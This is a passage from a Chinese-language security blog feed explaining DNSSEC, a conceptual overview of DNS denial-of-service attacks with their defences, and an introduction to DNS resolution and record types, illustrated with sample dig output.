都是用來簽署紀錄，幹嘛不用一把鑰匙就好，反正上一層的 DS 紀錄簽的都是鑰匙呀，哪一個有差嗎？</p>\n<p>其實也沒錯，RFC 裡其實並沒有規定一定要用兩把不同的 DNSKEY，不過基於維運跟安全上的考量，一般會分開來。就像密碼每隔一段時間就該更換一樣， DNSKEY 也是需要定期 rollover 的，如果你只有一把 DNSKEY，那每次更新就都要跑去上一層 zone 那邊更新你的 DS 紀錄，對網管來說是很麻煩的一件事。分成 ZSK KSK 的好處在於，ZSK 可以頻繁地更換（例如每年），反正每次更新自己用 KSK 簽一下並發布就好，KSK 則可以用久一點（例如每五年），減少跟上一層 zone 溝通的頻率。另一個優點是，因為 ZSK 使用的頻率比 KSK 高很多，所以兩者可以存放在不同的地方提升安全性：ZSK 放在容易存取的地方、KSK 放比較安全但不易存取的位置。如果只有一把鑰匙，那洩漏出去就完蛋了，但分成兩段之後，儘管 ZSK 的性質跟保護機制都讓他比 KSK 有更高的洩漏的可能，但只要管理好 KSK 的安全性至少就能頻繁 rollover 減低傷害，也讓信任鍊的維持有穩定的基礎，這也呼應了『錨』的特性吧！</p>\n<p>最後總結一下：DNSSEC 用信任鍊來建立 DNS 紀錄的完整性，而構成信任鍊需要增加幾筆新的紀錄類型：</p>\n<ul>\n<li>DNSKEY：在一個 zone 中，用來簽署 DNS 紀錄的公鑰，分成簽署一般紀錄的 ZSK 與簽署 DNSKEY 的 KSK。</li>\n<li>DS：不同層級的 zone 之間傳遞信任的紀錄，簽署了下層 zone 的 KSK。</li>\n<li>RRSIG：在一個 zone 中，用 ZSK 簽署 DNS 紀錄的結果，即簽章</li>\n</ul>\n<p>其實另外還有兩種『證明紀錄不存在』的紀錄類型： NSEC 與 NSEC3，不過這個我們留待下一篇講子網域枚舉時再一起說明，大家會更有感覺。</p>\n<h2 id=\"availability-(%E5%8F%AF%E7%94%A8%E6%80%A7)\"><a class=\"direct-link\" href=\"#availability-(%E5%8F%AF%E7%94%A8%E6%80%A7)\">#</a> Availability (可用性)</h2>\n<p>最後來到可用性，指的是服務的供給會不會被切斷，例如造成 DNS 超載停止回應、或是讓用戶收不到回覆等等 DoS (Denial of Service) 攻擊。</p>\n<p>這裡介紹幾種常見手法：</p>\n<ol>\n<li>NXDOMAIN attack: 攻擊者向 DNS resolver 大量請求不存在的網域（NXDOMAIN），讓 DNS resolver 忙於查詢這些目標而無法回應其他用戶的正當請求，或是也可以用來讓 DNS resolver 的 cache 塞滿攻擊者的垃圾回覆。其中一種變形是對一個合法存在的網域大量請求各種隨機產生的子網域，稱為 Random subdomain attack。</li>\n<li>Phantom domain attack: 攻擊者架設許多回應很慢或甚至不回應的 DNS（Phantom server），然後向 DNS resolver 大量請求這些 DNS 下的子網域，導致 DNS resolver 的資源都耗費在等待 Phantom server 的回覆，造成 performance 下降或是無法服務其他用戶。</li>\n<li>Domain lock-up attack: 這個攻擊類似前一個 Phantom domain attack，不過這次攻擊者架設的惡意 DNS 不僅會回覆，還會刻意放慢回覆時間、傳送垃圾封包，讓這個 TCP 連線不斷延長。當受害的 DNS resolver 跟這些惡意 DNS 溝通時就會被纏著不放（跟推銷電話一樣，但 resolver 很有禮貌不會直接掛斷），以致資源耗盡而卡住（lock-up）。</li>\n<li>DNS amplification attacks: 攻擊者發起大量請求的時候，利用封包裡面偽造的地址讓 DNS 把回覆反彈到受害者的機器，且往往都一次做大筆的 DNS query，達成用小流量的請求做到對受害者大流量回覆的倍增（amplification）效果。跟前面幾種都不一樣，這個攻擊的目標不是阻斷 DNS 的服務，而是讓受害者被大流量的 DNS 回覆吃光資源。</li>\n</ol>\n<p>更多攻擊方式可以參考 Infoblox 發布的 <a href=\"https://www.infoblox.com/wp-content/uploads/infoblox-ebook-top-ten-dns-attacks.pdf\">Top Ten DNS Attacks</a>。</p>\n<p>要避免 DNS 的可用性被破壞，我們有幾種選擇。</p>\n<p>第一，多買幾台好一點的機器，如果你的 DNS 能承受比預期流量多出數倍的負載，那就比較不容易被打垮。第二，用 <a href=\"https://www.cloudflare.com/learning/cdn/glossary/anycast-network/\">anycast routing</a> 讓多台機器共用 IP，等同讓多台機器作為彼此的 backup 服務用戶，達到 load balancing 的效果。</p>\n<p>第三，也是最普遍的做法，架設 DNS firewall，也就是一台擋在 authoritative DNS 之前的 firewall，不只可以設定規則擋掉或是只允許特定 IP，還可以充當 cache 的角色減輕 DNS 的負擔跟加速用戶 lookup，算是經濟實惠又最好管理的選擇。</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>最後稍微整理一下重點：</p>\n<table>\n<thead>\n<tr>\n<th>三要素</th>\n<th>問題</th>\n<th>解法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Confidentiality (機密性)</td>\n<td>防止 DNS queries 被監視或審查</td>\n<td>DoT(DNS over TLS), DoH(DNS over HTTPS)</td>\n</tr>\n<tr>\n<td>Integrity (完整性)</td>\n<td>防止 DNS 紀錄被竄改或偽造</td>\n<td>DNSSEC</td>\n</tr>\n<tr>\n<td>Availability (可用性)</td>\n<td>防止 DNS 被過多過大流量癱瘓導致使用者無法查詢</td>\n<td>DNS 防火牆</td>\n</tr>\n</tbody>\n</table>\n<p>想實際看一下 DNSSEC 各種紀錄跟驗證的話，可以參考這篇 <a href=\"https://www.cyberciti.biz/faq/unix-linux-test-and-validate-dnssec-using-dig-command-line/\">How to test and validate DNSSEC using dig command line</a> 跟這篇 <a href=\"https://ftp.eenet.ee/pub/isc/dnssec-guide/html/dnssec-guide.html#how-to-test-recursive-server\">BIND DNSSEC Guide</a>，教你如何用 <code>dig</code> 還有他的 DNSSEC 版 <code>delv</code> 指令測試。</p>\n<p>當然，還有更多的攻擊方式這裡沒辦法一一介紹，但希望有讓大家更了解 DNS 的資安問題與運作機制，附上一些參考資料：</p>\n<ul>\n<li>\n<p><a href=\"https://www.thesslstore.com/blog/dns-over-tls-vs-dns-over-https/\">What is the difference between DNS over TLS &amp; DNS over HTTPS?</a></p>\n</li>\n<li>\n<p><a href=\"https://www.cloudflare.com/learning/dns/dns-over-tls/\">Why does DNS need additional layers of security?</a></p>\n</li>\n<li>\n<p><a href=\"https://blog.cloudflare.com/dnssec-an-introduction/\">DNSSEC: An Introduction</a></p>\n</li>\n<li>\n<p><a href=\"https://www.cloudflare.com/learning/dns/dns-security/\">Why is DNS security important?</a></p>\n</li>\n<li>\n<p><a href=\"https://metebalci.com/blog/a-minimum-complete-tutorial-of-dnssec/\">A Minimum Complete Tutorial of DNSSEC</a></p>\n</li>\n<li>\n<p><a href=\"https://dnsinstitute.com/documentation/dnssec-guide/ch06.html\">DNSSEC Guide : Chapter 6. Advanced Discussions</a></p>\n</li>\n</ul>\n",
      "date_published": "2021-12-13T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/dns-hacking-1/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/dns-hacking-1/",
      "title": "DNS Hacking 之 基礎知識：DNS 運作與紀錄類型",
      "content_html": "<!-- summary -->\n<p>要打掛別人的網站難道只能從網頁中的漏洞下手嗎？其實，常常被忽略的 DNS 的漏洞可能更致命，讓駭客輕輕鬆鬆接管你的網站！但首先，我們要認識 DNS 的運作機制，以及有哪些紀錄類型。</p>\n<!-- summary -->\n<h2 id=\"dns-%E5%A6%82%E4%BD%95%E9%81%8B%E4%BD%9C\"><a class=\"direct-link\" href=\"#dns-%E5%A6%82%E4%BD%95%E9%81%8B%E4%BD%9C\">#</a> DNS 如何運作</h2>\n<p>想像一下你要寄一箱水果到客戶劉先生的家裡，但你並不知道人家的地址。你總不能就只把『螃蟹公司業務部門劉先生』寫在包裹外面，因為郵差先生當然也不知道這個人是誰、更不知道他到底住哪裡。那，你要怎麼知道劉先生的門牌號碼，順利寄出水果呢？</p>\n<p>首先，你可能會先 google 一下螃蟹公司的電話號碼，然後播一通電話過去問問該如何聯繫到業務部門的窗口。對方可能會給你另一支電話號碼或是轉撥分機，讓你聯繫上業務部門的人。最後，業務人員也許能直接從他的通訊錄中找到並告訴你劉先生家的地址，或是給你劉先生的電話讓你親自聯繫他。</p>\n<p>這樣經過層層關係追朔出地址的做法，就是 DNS 運作的方式。</p>\n<p>網路世界中，DNS 是一本巨大的通訊錄，紀錄每個網域的名稱（人看得懂的 <code>google.com</code>）與實際地址（人看不懂的 <code>172.217.160.78</code>）的對應關係。</p>\n<p>你可以想成是，有一個服務專線會幫你處理前述反覆打電話的過程，當你透過專線詢問『螃蟹公司業務部門劉先生』的地址時，他就會直接回覆你詳細的門牌資訊。</p>\n<p>當然，這麼複雜的工作不是一個人可以有效完成的，所以查詢的工作也需要多個層級的聯絡人，例如一個地方級聯絡人手上有信義區所有公司的電話號碼，而上一層的縣市級聯絡人手上則有所有地方級聯絡人的電話號碼，再往上也許還有區域級甚至全國級的聯絡人。為你服務的接線生手上也不會有所有聯絡人的資訊，畢竟這個清單太龐大了，而且他光是翻遍自己手上的筆記本就要耗費太多時間與資源。所以接線生的筆記本只會紀錄最常用的數筆電話號碼，以及最高層級的聯絡人（可以透過他層層推進往下查詢）。</p>\n<p>同理，DNS 也是一個樹狀結構，有層級的分別。實際的機制我們用下圖解釋：</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/dns-lookup.png\" /><figcaption><p>DNS Lookup</p>\n</figcaption></figure></p>\n<p>當小華雙十一想要大買特買，在瀏覽器輸入 <code>www.abc.com</code> 的網址時，會依照圖中的流程發生這些事：</p>\n<ol>\n<li>你的瀏覽器對撥打專線尋求接線生的協助，這個接線生就是我們說的 DNS resolver。</li>\n<li>稱職的接線生手上沒有 <code>www.abc.com</code> 的記錄，但為了幫你找到正確的地址，會先去詢問最高層級的 DNS，也就是概念上屬於 <code>.</code> 網域的 Root DNS。</li>\n<li>Root DNS 查一下自己手上的子網域清單，找到負責 <code>.com</code> 網域的 TLD(Top Level Domain) DNS，於是把這個地址轉介給 resolver。</li>\n<li>resolver 轉向 <code>.com</code> 網域的 TLD DNS 詢問 <code>www.abc.com</code> 的地址。</li>\n<li>TLD DNS 從手上的清單找到負責 <code>abc.com</code> 網域的 Authoritative DNS 的位置，回覆給 resolver。</li>\n<li>resolver 向負責 <code>abc.com</code> 網域的 Authoritative DNS 詢問 <code>www.abc.com</code> 這個子網域。</li>\n<li>Authoritative DNS 的記錄裡存在 <code>www.abc.com</code> 的記錄，把 IP 告訴 resolver！</li>\n<li>DNS resolver 回覆瀏覽器查詢結果，可能是一個或是數個 IP 的清單。</li>\n<li>瀏覽器對查到的 IP 發起 HTTP Request，成功帶小華到購物網站！</li>\n</ol>\n<p>經過好一番波折我們才終於得到一個網域名稱對應的實際 IP，如果每次都要經過這麼多次查詢未免太繁瑣了。作為一個世上最大的分散式資料庫系統，能快速查詢結果及同步更新是極為重要的。</p>\n<p>還記得我們說過接線生手上有一個紀錄聯絡人的筆記本嗎？每個 DNS resolver 都會有 caching 的機制，記錄一些常用聯絡人的資訊，讓查詢的過程可以跳過幾個步驟。如果接線生手上本來就有 <code>www.abc.com</code> 的地址，那就會直接回覆給瀏覽器，不用經過更多查詢。如果差了一點，只有 <code>abc.com</code> 網域的 Authoritative DNS 位置，那也可以直接跳到第六個步驟開始。通常 DNS resolver 手上本來就會有多個 TLD DNS 的位置了，所以除非 DNS cache 剛被清空，否則很少會需要從頭開始詢問 Root DNS。</p>\n<p>不過，DNS cache 中的紀錄也不是就一直存放在裡面的。每一筆紀錄都會有一個 TTL (Time-to-live)，這是一個代表『此紀錄可以被 cache 存多久』的數字，如果超過有效期限就表示這筆紀錄不新鮮，需要丟掉然後重新查詢一次來獲得新紀錄。這個機制的好處是能快速更新各個網域『搬家』的狀態，假設 TTL 為一小時，網管人員若是發布新的紀錄或是更改了服務的 IP，則可以確保至少在一小時後新紀錄就能生效，否則 DNS resolver 怎麼確認手上的地址是否還有效呢？</p>\n<p>整理一下幾種角色：</p>\n<ul>\n<li>Root DNS：最高層級的 DNS，共有 13 種，全世界共有 600-700 多台，由 ICANN 管理，是每個 DNS Resolver 的已知資訊。存放關於各個 TLD DNS 的資訊。</li>\n<li>TLD DNS：次高層級的 DNS，負責如 <code>.com</code>、<code>.net</code>、<code>.org</code>、<code>.tw</code> 等最後一個後綴的網域，會存放各個 Authoritative DNS 的資訊。由 ICANN 下的分支 IANA 管理。</li>\n<li>Authoritative DNS：其他較低層級的 DNS，一般來說會是查詢的最後一站，專屬於掌握此網域的機構並存放此機構的子網域資訊。</li>\n<li>DNS Resolver：Lookup 的第一站，接線生的角色。 DNS cache 中會存放常用聯絡人，或更精確的說，最近使用的聯絡人的紀錄，向其他 DNS 查詢後會把回覆的紀錄寫進 cache。</li>\n</ul>\n<h2 id=\"dns-%E8%A8%98%E9%8C%84%E6%9C%89%E5%93%AA%E4%BA%9B\"><a class=\"direct-link\" href=\"#dns-%E8%A8%98%E9%8C%84%E6%9C%89%E5%93%AA%E4%BA%9B\">#</a> DNS 記錄有哪些</h2>\n<p>DNS 記錄非常多種，常見的有： <code>SOA</code>、<code>A</code>、<code>AAAA</code>、<code>CNAME</code>、<code>NS</code>、<code>MX</code>、<code>TXT</code>、<code>SRV</code>、<code>PTR</code></p>\n<p>不常見的還有： <code>DNSKEY</code>、<code>CAA</code>、<code>IPSECKEY</code>、<code>RRSIG</code>、<code>NSEC</code>、<code>AFSDB</code>、<code>APL</code>、<code>CDNSKEY</code>、<code>CERT</code>、<code>DCHID</code>、<code>DNAME</code>、<code>HIP</code>、<code>LOC</code>、<code>NAPTR</code>、<code>P</code>、<code>SSHFP</code> 等等</p>\n<p>這裡我們先介紹常見的紀錄，不常見的下次再說 XDDD</p>\n<h3 id=\"soa\"><a class=\"direct-link\" href=\"#soa\">#</a> SOA</h3>\n<p>在討論 SOA 記錄之前，我們需要先了解 DNS zone 的概念。</p>\n<p>很多人誤以為一個網域就是一個 DNS zone，但其實 zone 是一個方便管理 DNS 記錄的分群法，或者可以說是『適合通一管理的網域們的紀錄集合』。</p>\n<p>想像你的公司 <code>abc.com</code> 有三個子網域：<code>blog.abc.com</code>、<code>news.abc.com</code>、<code>internal.abc.com</code>，可能本來都放在同一個 DNS zone。但有一天你發現了一個問題：性質上，<code>internal.abc.com</code> 是內部網域，會需要較嚴格的權限控管，而且下面也許還有更多子網域來辨別各個內部系統；另一方面，<code>abc.com</code>、<code>blog.abc.com</code>、<code>news.abc.com</code> 都是官網上會連結到的對外網域，性質較為相近。當你想要進行設定時，要一次設置共用設定有些困難、個別處理又顯得麻煩，各個網域全部混雜在一起讓你管理變得複雜。</p>\n<p>這時，你就會考慮將 <code>internal.abc.com</code> 獨立出來變成自己的 DNS zone，這個切分允許管理者做更精細的控制，而且日後擴展新的子網域也更方便套用設定。</p>\n<p>所以，DNS zone 可以是一個網域、多個網域、或是一個網域以及他的數個子網域等等各種分群方式，一台 DNS 上也可以有多個 DNS zone。</p>\n<p>每個 DNS zone 都能用一個 zone file 代表，基本上就是一個文字檔，寫著所有屬於此 DNS zone 的網域的所有紀錄。而 zone file 的第一筆必須是 SOA (Start of Authority) 紀錄，主要記載這個 zone 相關的資訊，例如管理員信箱、用來辨別是否有更新的序號、主要的 NS 等等。</p>\n<p>此外，主要負責管理 zone file 的那一台 DNS 稱為 primary nameserver，其餘備用或是用於 load balancing 的 nameserver 稱為 secondary nameserver，只有 zone file 的唯讀權限，並且會透過一個稱為 zone transfer 的溝通過程從 primary nameserver 那裡更新 zone file。</p>\n<p>SOA 紀錄的欄位及敘述，以 <code>example.com</code> 為範例整理成下面這張表：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">example.com.\t\t3600\tIN\tSOA\tns.icann.org. noc.dns.icann.org. 2021110801 7200 3600 1209600 3600</code></pre>\n<table>\n<thead>\n<tr>\n<th>欄位</th>\n<th>值</th>\n<th>敘述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>name</td>\n<td><a href=\"http://example.com\">example.com</a></td>\n<td></td>\n</tr>\n<tr>\n<td>record</td>\n<td>SOA</td>\n<td></td>\n</tr>\n<tr>\n<td>MNAME</td>\n<td><a href=\"http://ns.icann.org\">ns.icann.org</a></td>\n<td>DNS zone 的 primary nameserver</td>\n</tr>\n<tr>\n<td>RNAME                     </td>\n<td><a href=\"http://noc.dns.icann.org\">noc.dns.icann.org</a>                     </td>\n<td>管理員信箱，第一個點其實翻譯成 <code>@</code> ，所以這個例子中是 <code>noc@dns.icann.org</code></td>\n</tr>\n<tr>\n<td>SERIAL</td>\n<td>2021110801</td>\n<td>可以想成版本序號，更動時會讓 secondary nameserver 知道該更新了</td>\n</tr>\n<tr>\n<td>REFRESH</td>\n<td>7200</td>\n<td>secondary nameserver 詢問更新該間隔的時間</td>\n</tr>\n<tr>\n<td>RETRY</td>\n<td>3600</td>\n<td>若 primary nameserver 沒有回應，secondary nameserver 再次詢問前該間隔的時間</td>\n</tr>\n<tr>\n<td>EXPIRE</td>\n<td>1209600</td>\n<td>primary nameserver 多久沒有回應，secondary nameserver 該停止回應 DNS query</td>\n</tr>\n<tr>\n<td>TTL</td>\n<td>3600</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"a%2Faaaa\"><a class=\"direct-link\" href=\"#a%2Faaaa\">#</a> A/AAAA</h3>\n<p>最基本的 DNS 記錄，代表 Address，也就是實際的 IP 地址。 A 用於 IPv4 地址，AAAA 用於 IPv6 地址。</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">example.com.\t\t17460\tIN\tA\t93.184.216.34</code></pre>\n<p>一般來說只會有一筆 A 紀錄，不過你可能在用 AWS 等第三方服務的時候會發現 <code>dig</code> 指令竟然顯示了好幾筆紀錄，這其實是實作 load balancing 的一種方法，用數個 IP 分散網站的流量。</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">abc.com.\t\t60\tIN\tA\t13.226.115.26<br>abc.com.\t\t60\tIN\tA\t13.226.115.14<br>abc.com.\t\t60\tIN\tA\t13.226.115.45<br>abc.com.\t\t60\tIN\tA\t13.226.115.117<br>abc.com.\t\t300\tIN\tNS\tns-1368.awsdns-43.org.<br>abc.com.\t\t300\tIN\tNS\tns-1869.awsdns-41.co.uk.<br>abc.com.\t\t300\tIN\tNS\tns-318.awsdns-39.com.<br>abc.com.\t\t300\tIN\tNS\tns-736.awsdns-28.net.<br>abc.com.\t\t900\tIN\tSOA\tns-318.awsdns-39.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400</code></pre>\n<h3 id=\"cname\"><a class=\"direct-link\" href=\"#cname\">#</a> CNAME</h3>\n<p>CNAME 指的是 canonical name，也就是標準的、真實的名稱，讓指向的網域作為別名代表自己的意思。可以想成是一條線索接著一條線索，順著指向最終的寶藏。</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">foo.abc.com.\t21600\tIN\tCNAME\tbar.abc.com</code></pre>\n<p>進行 DNS lookup 的時候，如果得到 CNAME 紀錄，就會以對應的網域為目標重啟一次新的 DNS lookup，直到成功解析出 IP 為止。也因此，CNAME 紀錄跟 A 紀錄互斥，後者是直接給出網域對應的 IP，前者則是把原本的網域映射到另一個網域，等同採用對方的 DNS 紀錄。如果一個網域有 CNAME 紀錄，那麼根據 RFC ，除了使用 DNSSEC 的情況會設置 RRSIG、NSEC 的紀錄外，不能有其他的 DNS 紀錄（例如 NS、MX、TXT 等等）</p>\n<p>你可能會困惑，如果兩個網域最後都解析到同一個 IP，那我們為什麼不刪掉其中一個就好了，反正都會是同一個網站啊？</p>\n<p>這個問題的盲點在於，同一台機器的同一個 port 並不是只能運行一個網站，網頁伺服器是可以透過網址決定處理方式的。</p>\n<p>假設你有 <code>blog.abc.com</code> 跟 <code>news.abc.com</code> 兩個網域，且他們都用 CNAME 紀錄指到 <code>abc.com</code>。當你 URL 輸入 <code>http://blog.abc.com/</code> 時，這個請求同樣是送到 <code>abc.com</code> 的 IP，但是網站伺服器會判斷是要存取 <code>blog.abc.com</code> 的資料而回應公司的部落格頁面。透過網站伺服器的分流，就能讓使用不同 URL 的訪客分別存取到部落格、時事、跟主網頁的資訊。而且這樣做的好處是，這三個網域都在同一台機器上，所以要變更 IP 的時候只要調整 <code>abc.com</code> 的 A 紀錄就可以確保三個都一起搬家。</p>\n<h3 id=\"ns\"><a class=\"direct-link\" href=\"#ns\">#</a> NS</h3>\n<p>NS 指的是 name server，也就是負責解析這個網域的 Authoritative DNS，所以 NS 紀錄就代表『去這個 DNS 問可以找到你要的 IP 喔』。</p>\n<p>如同前面介紹過的，一個 DNS zone 通常不會只有一台 DNS 在運行，所以相對的 NS 紀錄也通常會有多筆資料。這些 Authoritative DNS 就是負責這個 DNS zone 的 primary nameserver 跟 secondary nameserver 們。</p>\n<p>你可以拿一些網域試試看，會發現往往都會在主網域下發現 SOA 紀錄跟多筆 NS 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">$ dig any onedegree.hk<br><br>;; ANSWER SECTION:<br>onedegree.hk.\t\t21600\tIN\tNS\tns1-03.azure-dns.com.<br>onedegree.hk.\t\t21600\tIN\tNS\tns2-03.azure-dns.net.<br>onedegree.hk.\t\t21600\tIN\tNS\tns3-03.azure-dns.org.<br>onedegree.hk.\t\t21600\tIN\tNS\tns4-03.azure-dns.info.<br>onedegree.hk.\t\t3600\tIN\tSOA\tns1-03.azure-dns.com. azuredns-hostmaster.microsoft.com. 20200910 3600 300 2419200 300<br>...</code></pre>\n<p>這並不是說子網域不能有 NS 紀錄，只是通常一個 DNS zone 會以一個主網域以及他下面的多個子網域構成，所以 SOA、NS 等代表整個 zone 的資訊就會掛在主要網域的下面。</p>\n<h3 id=\"mx\"><a class=\"direct-link\" href=\"#mx\">#</a> MX</h3>\n<p>MX 指的是 mail exchange，也就是郵件伺服器，所以 MX 紀錄指示的是『負責這個網域的郵件伺服器的網域』。</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">onedegree.hk.\t\t3600\tIN\tMX\t0 onedegree-hk.mail.protection.outlook.com.</code></pre>\n<p>當你要寄出一封信到 <code>receiver@onedegree.hk</code> 時，幫你寄信的 mail server 首先會去查找 <code>onedegree.hk</code> 的 MX 紀錄，得知信件應該送到 <code>onedegree-hk.mail.protection.outlook.com</code> 這個網域。再來才會透過 SMTP（email 專用的協議）把信送到 <code>onedegree-hk.mail.protection.outlook.com</code> 實際上的 IP 位置。沒有設置 MX 紀錄就像不告訴機長目的地的機場在哪裡，信件會完全無法發送。</p>\n<p>為了增加維運的穩定度，MX 紀錄也可以有很多筆，但是 SOA 紀錄裡又沒有標示 primary mail server 之類的主次關係，寄信的時候怎麼知道要用哪一個結果呢？</p>\n<p>上面的範例紀錄中，除了 TTL (<code>3600</code>) 之外還有一個寫在目標網域之前的數字 <code>0</code>，這個數字是 priority number，可以想像成是採用紀錄的優先序，所以帶有越小的數字表示越優先寄送給這個 mail server。兩個不同 priority number 的 MX 紀錄自然好懂，就是先嘗試寄給數字小的，如果失敗了再嘗試寄到數字大的。那如果兩個 MX 紀錄 有一樣大的 priority number，就是隨機採用其中一筆紀錄，做 load balancing 達到信件分流減少負載的效果。</p>\n<h3 id=\"txt\"><a class=\"direct-link\" href=\"#txt\">#</a> TXT</h3>\n<p>TXT 指的是 text，也就是純文字的紀錄，原意是讓網管能為他的網域加一些註解，不過現在大多主要用於防範垃圾信以及驗證網域擁有權。</p>\n<p>格式基本上沒有限制，雖然 RFC 有定義需要是由雙括號包住、等號分隔的 key-value 型態（<code>&quot;attribute=value&quot;</code>），但並不是所有的 TXT 紀錄都會遵守此規範。</p>\n<p>以防範垃圾信及偽冒信來說，會設置 SPF、DKIM、DMARC 這三個目前廣泛套用的機制，利用合法發信網域宣告的 IP 位置及郵件政策來實現 email security。這三筆紀錄會在郵件驗證的時候被查詢且採用，以此保障收受信人的安全。</p>\n<p>更詳細的介紹可以參考我之前寫過的一系列文章：</p>\n<p><a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory\">關於 email security 的大小事 — 原理篇</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf\">關於 email security 的大小事 — 設定篇 SPF</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc\">關於 email security 的大小事 — 設定篇 DKIM、DMARC</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples\">關於 email security 的大小事 — 範例篇</a><br>\n<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra\">關於 email security 的大小事 — 延伸篇</a></p>\n<p>另一方面，當我們使用第三方服務，例如用 Sendgrid 替自己的網域寄信、或是希望創建出的電商頁面掛上自己的子網域名時，往往會需要先驗證網域擁有權，避免有心人士濫用服務來仿冒我們的網域。這時候廠商就可能會要求我們發一筆指定的 TXT 紀錄以茲證明，畢竟如果你真的是網域的擁有者，就應該能夠存取發佈 DNS 紀錄。這個概念就像是用某個信箱註冊服務時，必須去信箱裡點選確認信才能證明信箱真的是你的。</p>\n<p>舉例來說，網頁為了行銷需求大多會設置 Google Analytics (GA) 來幫助 marketing 了解使用者的行為，因為這些資料也許包含過多或是敏感的商業資訊，所以 Google 為了確保能存取資料的必須是網域的擁有者，會要求用戶先驗證網域所有權，在 DNS 發佈一筆 <code>&quot;google-site-verification=&lt;long-random-string&gt;&quot;</code>，然後當 Google 檢查 TXT 紀錄發現確實存在這筆指定紀錄，就可以證明是合法的網域擁有者。</p>\n<p>下圖是 <code>onedegree.hk</code> 的一些 TXT 紀錄，你可以看到有多種驗證紀錄及 SPF 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">onedegree.hk.\t\t3600\tIN\tTXT\t\"facebook-domain-verification=etkvd5dxxpnlcjkol3e1vi3k348k03\"<br>onedegree.hk.\t\t3600\tIN\tTXT\t\"google-site-verification=kEw0MSSQxwrU4d5GXYBTL6HLTwnQW4aJjh8Om-NTY4Q\"<br>onedegree.hk.\t\t3600\tIN\tTXT\t\"google-site-verification=EntX-1hrFmMHtANmXdTE4rpEwSxpsZGwnVUPWA9476A\"<br>onedegree.hk.\t\t3600\tIN\tTXT\t\"VXZDM75TVG5AVR81FP8ZS1Q3RTRJCPO1LFMCGU6G\"<br>onedegree.hk.\t\t3600\tIN\tTXT\t\"v=spf1 include:spf.protection.outlook.com include:servers.mcsv.net include:email.freshdesk.com -all\"<br>onedegree.hk.\t\t3600\tIN\tTXT\t\"MS=ms90944132\"<br>onedegree.hk.\t\t3600\tIN\tTXT\t\"apple-domain-verification=6dcjCOWtHHIBWjLW\"<br>onedegree.hk.\t\t3600\tIN\tTXT\t\"atlassian-domain-verification=x2gMLRLJwdsyccXscDcOrLausiFdjmV/P37fCfiKf/eEaA6l9tPsfrEadfGQsA7j\"<br></code></pre>\n<h3 id=\"srv\"><a class=\"direct-link\" href=\"#srv\">#</a> SRV</h3>\n<p>SRV 紀錄算是相對少見的一種紀錄，是為了支援特定網路協議（例如 <a href=\"https://en.wikipedia.org/wiki/Session_Initiation_Protocol\">SIP</a>、<a href=\"https://en.wikipedia.org/wiki/XMPP\">XMPP</a> 等多媒體或 messaging 功能）的服務 (<strong>s</strong>e<strong>rv</strong>ice) 所誕生的紀錄，定義在 <a href=\"https://datatracker.ietf.org/doc/html/rfc2782\">RFC 2782</a> 中。</p>\n<p>其他的 DNS 紀錄大多都只會含有網域名或是 IP，不過 SRV 紀錄最大的特色就是會寫出目標 port 以及使用的協議，格式為：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">_service._proto.name.   TTL  class type priority weight port    target<br><br>_xmpp._tcp.example.com. 86400  IN   SRV    10       5   5223  server.example.com</code></pre>\n<p>從上面的範例可以看到，要向 <code>example.com</code> 發起使用 TCP 的 XMPP 服務請求的話，就需要聯繫 <code>server.example.com</code> 的 5223 port。</p>\n<p>那 priority 跟 weight 是什麼呢？跟前面提過的 MX 紀錄相似，這兩個參數都是用來調配目標伺服器的流量，只不過是分兩階段評比，先比 priority 再比 weight。也就是說，查詢到多筆 SRV 紀錄時會先看 priority 的大小，如果平手了再用 weight 一決勝負。有趣的一點是這兩個的勝負條件完全相反，priority （優先序）代表嘗試連線的順序，越小越吃香；反之 weight （權重）代表同優先序之間負載分配的比例，所以越大越有利。</p>\n<p>下面的範例取自<a href=\"https://en.wikipedia.org/wiki/SRV_record\">維基百科</a>：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">_sip._tcp.example.com.   86400 IN    SRV 10       60     5060 bigbox.example.com.<br>_sip._tcp.example.com.   86400 IN    SRV 10       20     5060 smallbox1.example.com.<br>_sip._tcp.example.com.   86400 IN    SRV 10       20     5060 smallbox2.example.com.<br>_sip._tcp.example.com.   86400 IN    SRV 20       0      5060 backupbox.example.com.</code></pre>\n<p>今天一個用戶想要連線時，會發現前三條紀錄的 priority 都是 10，所以除非前三個都連不上，否則他是不會去嘗試 priority 20 的 <code>backupbox.example.com</code> 的。再來，因為 priority 10 的比重是 60 20 20，所以代表有 60% 的請求會選擇發給 <code>bigbox.example.com</code>，剩下的再平分到 <code>smallbox1.example.com</code> 跟 <code>smallbox2.example.com</code> 這兩台機器。另外，如果 <code>bigbox.example.com</code> 沒有回應，那麼服務就會由 <code>smallbox1.example.com</code> 跟 <code>smallbox2.example.com</code> 平均分擔，各處理 50% 的流量。</p>\n<h3 id=\"ptr\"><a class=\"direct-link\" href=\"#ptr\">#</a> PTR</h3>\n<p>PTR 紀錄可以說是 A 紀錄的對立面，A 紀錄把網域對應到 IP（用於 DNS lookup），而 PTR 紀錄則是把 IP 對應到網域（用於 reverse DNS lookup）。</p>\n<p>PTR 紀錄也必須放在某個網域下，所以根據規範，會將 IP 